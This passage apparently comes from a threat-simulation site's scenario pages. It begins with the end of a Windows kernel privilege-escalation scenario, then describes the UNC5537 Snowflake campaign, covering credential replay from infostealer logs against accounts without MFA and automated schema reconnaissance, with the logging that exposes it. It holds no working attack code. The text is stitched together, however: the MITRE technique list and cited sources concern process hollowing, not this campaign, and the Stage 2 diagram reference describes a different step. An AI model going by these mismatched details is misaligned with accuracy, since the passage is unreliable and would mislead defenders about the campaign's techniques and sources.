(SYSTEM)) from Node ③ (#3 CLFS.sys (Kernel Driver)) to Node ④ (#4 ntoskrnl.exe (EPROCESS Token)), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR). [Specs: ELEVATED CONTEXT=NT AUTHORITY\SYSTEM; RANSOMWARE PAYLOAD=nokoyawa.exe (ECC secp256k1 + Salsa20); DISCOVERY CREDIT=Kaspersky GReAT (Securelist) / Microsoft MSRC]

### T1078.004: Mandiant & Snowflake — UNC5537 Campaign: Infostealer Credential Replay & FROSTBITE (Rapeflake) Exfiltration
- **Scenario ID**: `snowflake-unc5537-saas-extortion`
- **Canonical URL**: https://attackexplorer.org/scenarios/snowflake-unc5537-saas-extortion
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=snowflake-unc5537-saas-extortion
- **Category**: CLOUD_SAAS | **Severity**: CRITICAL
- **Subtitle**: Mandiant · Snowflake · CISA · Infostealer Logs · Missing MFA · Rapeflake / DBeaver Bulk SQL Staging
- **Overview**: Imagine a high-security cloud storage facility (Snowflake) where the vault doors themselves are unbreakable, but several corporate tenants told the front desk: "Let our contractors walk in with just a written password, don’t ask them for a second security badge (MFA = NULL) or check what taxi (IP Network Policy) they arrived in." Synthesizing Mandiant’s UNC5537 investigation, Snowflake’s joint security advisory, and CISA guidance (June 2024), this scenario models how financially motivated threat actor UNC5537 breached over 165 enterprise Snowflake customer tenants without exploiting any vulnerability in Snowflake itself. The actors extracted valid corporate credentials from historical infostealer malware logs (RedLine, Vidar, LummaC2), logged into single-factor accounts lacking Multi-Factor Authentication (SECOND_AUTHENTICATION_FACTOR = NULL) and Network Policies, ran the custom .NET utility FROSTBITE (Rapeflake) to enumerate schemas, and used DBeaver Ultimate to stage (COPY INTO) and download multi-gigabyte customer tables.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)

  - Stage 1 (T1078.004 · Valid Accounts: Cloud Accounts): **INFOSTEALER CREDENTIAL REPLAY ON SINGLE-FACTOR TENANT** — Instead of picking the vault lock, the intruder searches old stolen notebooks (RedLine / Lumma stealer logs) for saved *.snowflakecomputing.com passwords and walks straight into any tenant that forgot to require a second badge (MFA). UNC5537 searches millions of historical infostealer malware logs (harvested by RedLine, Vidar, and LummaC2 from contractor laptops infected months or years earlier) for URLs matching *.snowflakecomputing.com, and replays those plaintext credentials from Mullvad VPN exit nodes (198.51.100.44) against the customer’s Snowflake login API (which succeeds whenever the target account has SECOND_AUTHENTICATION_FACTOR = NULL and no Snowflake Network Policy restricting logins to corporate IP ranges). Because service accounts like SVC_TABLEAU_ETL were frequently configured with static passwords and exempted from MFA to support legacy BI pipelines, possessing a single unrotated password gave UNC5537 immediate ACCOUNTADMIN or SYSADMIN access. In the documented SNOWFLAKE LOGIN_HISTORY exchange from UNC5537 Extortion Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with RESP EVENT_ID 8841920 (confirming that the SINGLE_FACTOR_LOGIN_SUCCESS request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 FROSTBITE (RAPEFLAKE) AUTOMATED SCHEMA RECONNAISSANCE). On the diagram, follow Step #1 / Link #1 (#1→ SINGLE_FACTOR_LOGIN_SUCCESS / ⇠#1 RESP EVENT_ID 8841920) from Node ① (#1 UNC5537 Extortion Operator) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Snowflake ACCOUNT_USAGE & SIEM). [Specs: INITIAL VECTOR=Plaintext Credentials from RedLine / Vidar / Lumma Stealer Logs; AUTH GAP=SECOND_AUTHENTICATION_FACTOR = NULL & Missing Network Policy; CLIENT FINGERPRINT=FROSTBITE (Rapeflake) / .NET Snowflake Driver]
  - Stage 2 (T1087.004 · Account Discovery: Cloud Account): **FROSTBITE (RAPEFLAKE) AUTOMATED SCHEMA RECONNAISSANCE** — Once inside the lobby, the thief switches on a custom barcode scanner (FROSTBITE / Rapeflake) that races down every aisle in 2 seconds, printing a list of which vaults hold millions of customer records. Immediately after authenticating, the operator runs a custom .NET reconnaissance tool tracked by Mandiant as FROSTBITE (which identifies itself in Snowflake’s CLIENT_APPLICATION_ID telemetry under its internal build name "Rapeflake") to automatically execute SHOW DATABASES, SHOW USERS, SHOW ROLES, and SELECT * FROM INFORMATION_SCHEMA.TABLES (allowing the attacker to instantly score and prioritize customer tenants that hold hundreds of millions of PII or payment rows). Every SQL query and client driver string in Snowflake is immutably recorded in SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY and SESSIONS, exposing the literal "Rapeflake" and "DBeaver_DBeaverUltimate" application strings. On the diagram, follow Step #3 / Link #3 (#3→ BULK_STAGE_EXFILTRATION / ⇠#3 RESP BYTES_WRITTEN 4.8 GB) from Node ③ (#3 Snowflake Cloud Auth Gateway) to Node ④ (#4 FROSTBITE (Rapeflake) Recon Engine), monitored by Node ⑥ (#6 Snowflake ACCOUNT_USAGE & SIEM).
